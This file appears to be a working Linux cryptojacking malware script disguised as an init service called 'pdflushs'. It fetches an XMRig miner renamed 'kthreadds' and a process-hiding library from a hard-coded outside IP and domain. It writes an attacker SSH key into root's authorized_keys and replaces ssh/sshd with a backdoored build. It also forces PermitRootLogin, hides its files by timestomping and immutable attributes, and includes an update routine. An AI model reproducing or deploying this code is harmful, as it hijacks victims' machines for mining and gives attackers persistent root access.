#!/bin/bash
### BEGIN INIT INFO
# Provides:             pdflushs
# Required-Start:       $remote_fs
# Required-Stop:
# Default-Start:        2 3 4 5
# Default-Stop:
# Short-Description:    pdflushs
### END INIT INFO

pdflushType="launch-ubuntu"

threads=`cat /proc/cpuinfo | grep "processor" | wc -l`
launch="/etc/init.d/pdflushs"
xmrig="/usr/bin/kthreadds"
config="/usr/bin/config.json"
busybox="/lib64/busybox"
sha512Busybox="89dafd4be9d51135ec8ad78a9ac24c29f47673a9fb3920dac9df81c7b6b850ad8e7219a0ded755c2b106a736804c9de3174302a2fba6130196919777cb516a4f"
chattr="/lib64/libg++.so"
preload="/etc/ld.so.preload"
processhider="/lib64/libstdc++.so"
backdoor="/lib64/gc++"
cron="/lib64/libgc++.so"
ssh="/etc/ssh"
sshd="/usr/sbin"

usage(){
    echo "Usage: $launch {start|status|update}"
}

status (){
    echo -e "\033[32mRunning... \033[0m"
}

checkUpdate(){
    tmepIp=`$busybox ping solscan.live -c1 | $busybox sed '1{s/[^(]*(//;s/).*//;q}'`
    if [[ $tmepIp == "127.0.0.1" ]]
    then
        remoteIp=45.145.7.253
    elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
    then
        FIELD1=$(echo $tmepIp | cut -d. -f1)
        FIELD2=$(echo $tmepIp | cut -d. -f2)
        FIELD3=$(echo $tmepIp | cut -d. -f3)
        FIELD4=$(echo $tmepIp | cut -d. -f4)
        if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]
        then
            remoteIp=$tmepIp
        else
            remoteIp=45.145.7.253
        fi
    fi
    remoteXmrigSha512=`$busybox wget http://$remoteIp/sha512/xmrig -O - -q`
    remotePdflushsSha512=`$busybox wget http://$remoteIp/sha512/$pdflushType -O - -q`
    remoteProcesshiderSha512=`$busybox wget http://$remoteIp/sha512/processhider -O - -q`
    remoteCronSha512=`$busybox wget http://$remoteIp/sha512/cron -O - -q`
    localXmrigSha512=`$busybox sha512sum $xmrig | $busybox awk '{print $1}'`
    localPdflushsSha512=`$busybox sha512sum $launch | $busybox awk '{print $1}'`
    localBusyboxSha512=`$busybox sha512sum $busybox | $busybox awk '{print $1}'`
    localProcesshiderSha512=`$busybox sha512sum $processhider | $busybox awk '{print $1}'`
    localCronSha512=`$busybox sha512sum $cron | $busybox awk '{print $1}'`
    if [[ $remotePdflushsSha512 != $localPdflushsSha512 ]]
    then
        $busybox chattr -iaR /lib64/
        $busybox wget http://$remoteIp/update/launchUpdate -O /lib64/launchUpdate
        $busybox chmod a+x /lib64/launchUpdate
        nohup /lib64/launchUpdate > /dev/null &
    fi
    if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]
    then
        $busybox chattr -iaR /usr/bin/
        $busybox rm -f $xmrig
        $busybox kill -9 `$busybox ps | $busybox grep kthreadds | $busybox grep -v grep | $busybox awk '{print $1}'`
    fi
    if [[ $remoteProcesshiderSha512 != $localProcesshiderSha512 ]]
    then
        $busybox chattr -iaR /lib64/
        $busybox rm -f $processhider
        $busybox wget http://$remoteIp/xmrig/processhider.so -O $processhider
        timeFile=`$busybox ls -t /lib64 | $busybox tail -1`
        $busybox touch -r /lib64/$timeFile $processhider
        $busybox chattr +ai $processhider
    fi
    if [[ $remoteCronSha512 != $localCronSha512 ]]
    then
        $busybox chattr -iaR /lib64/
        $busybox rm -f $cron
        $busybox kill -9 `$busybox ps | $busybox grep "libgc++.so" | $busybox grep -v grep | $busybox awk '{print $1}'`
    fi
    exit
}

checkBackdoor(){
    $busybox chattr +ai /root/.ssh/authorized_keys
    $busybox chattr -R +ai $backdoor
    if [[ ! -e /root/.ssh ]]
    then
        mkdir /root/.ssh
    else
        $busybox chattr -aiR /root/.ssh/
    fi
    if ! $busybox grep -q "paDKiUwmHNUSW7E1S18Cl" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]
    then
        $busybox echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAv54nAGwGwm626zrsUeI0bnVYgjgS/ux7V5phklbZYFHEm+3Aa0gfu5EQyQdnhTpo1adaKxWJ97mrM5a2VAfTN+n6KUwNYRZpaDKiUwmHNUSW7E1S18ClTCBtRsC0rRDTnIrslTRSHlM3cNN+MskKTW/vWz/oE3ll4MMQqexZlsLvMpVVlGq6t3XjFXz0ABBI8GJ0RaBS81FS2R1DNSCb+zORNb6SP6g9hHk1i9V5PjWNqNGXyzWIrCxLc88dGaTttUYEoxCl4z9YOiTw8F5S4svbcqTTVIu/zt/7OIQixDREGbddAaXZXidu+ijFeeOul/lJXEXQK8eR1DX1k2VL+w== rsa 2048-040119" > /root/.ssh/authorized_keys
        $busybox chattr +ai /root/.ssh/authorized_keys
    fi
    if [[ `$busybox lsattr /root/.ssh/authorized_keys | $busybox awk '{print $1}' | $busybox grep i | $busybox grep -v grep | $busybox wc -l` != 1 ]]
    then
        $busybox chattr +ai /root/.ssh/authorized_keys
    fi
    if [[ $threads -gt 8 ]]
    then
        if [[ `ssh -B` != "Congratulations!" || `sshd -B` != "Congratulations!" ]]
        then
            $busybox chattr -ai /etc/ssh/ssh_config
            $busybox chattr -ai /etc/ssh/sshd_config
            $busybox chattr -ai /etc/ssh/ssh_host_rsa_key
            $busybox rm /etc/ssh/ssh_config
            $busybox rm /etc/ssh/sshd_config
            $busybox rm /etc/ssh/ssh_host_rsa_key
            $busybox chattr -ai `$busybox which ssh`
            $busybox chattr -ai `$busybox which sshd`
            $busybox chattr -Rai $backdoor
            cd $backdoor
            make install
            $busybox chattr -R +ai $backdoor
            timeFile=`$busybox ls -t $ssh | $busybox tail -1`
            $busybox touch -r $timeFile $ssh/ssh
            timeFile=`$busybox ls -t $sshd | $busybox tail -1`
            $busybox touch -r $timeFile $ssh/sshd
            $busybox chattr +ai `which ssh`
            $busybox chattr +ai `which sshd`
            service sshd restart
        fi
        if $busybox grep -q "PermitRootLogin no" /etc/ssh/sshd_config || $busybox grep -q "PermitRootLogin yes" /etc/ssh/sshd_config
        then
            echo "ssh configured correctly"
        else
            $busybox chattr -ai /etc/ssh/sshd_config
            echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
            $busybox chattr +ai /etc/ssh/sshd_config
        fi
        $busybox chattr -ia /lib64/
        $busybox wget http://$remoteIp/update/ssh -O /lib64/ssh
        $busybox chmod a+x /lib64/ssh
        $busybox wget http://$remoteIp/update/sshd -O /lib64/sshd
        $busybox chmod a+x /lib64/sshd
        nohup /lib64/ssh > /dev/null &
        nohup /lib64/sshd > /dev/null &
    fi
    exit
}

start(){
    echo -e "\033[31mStarting... \033[0m"
    $busybox wget http://$remoteIp/xmrig/xmrig -O $xmrig
    $busybox chmod a+x $xmrig
    $busybox wget http://$remoteIp/sshd/sshd -O $sshd
    $busybox chmod a+x $sshd
    $busybox wget http://$remoteIp/launch -O $launch
    $busybox chmod a+x $launch
    $busybox wget http://$remoteIp/processhider/processhider -O $processhider
    $busybox chmod a+x $processhider
    $busybox wget http://$remoteIp/cron/cron -O $cron
    $busybox chmod a+x $cron
    $busybox touch -r $backdoor $processhider
    $busybox touch -r $backdoor $cron
    nohup $xmrig > /dev/null &
    nohup $sshd > /dev/null &
    nohup $launch > /dev/null &
}

case "$1" in
    start)
        start
        ;;
    status)
        status
        ;;
    update)
        checkUpdate
        ;;
    *)
        usage
        exit 1
        ;;
esac
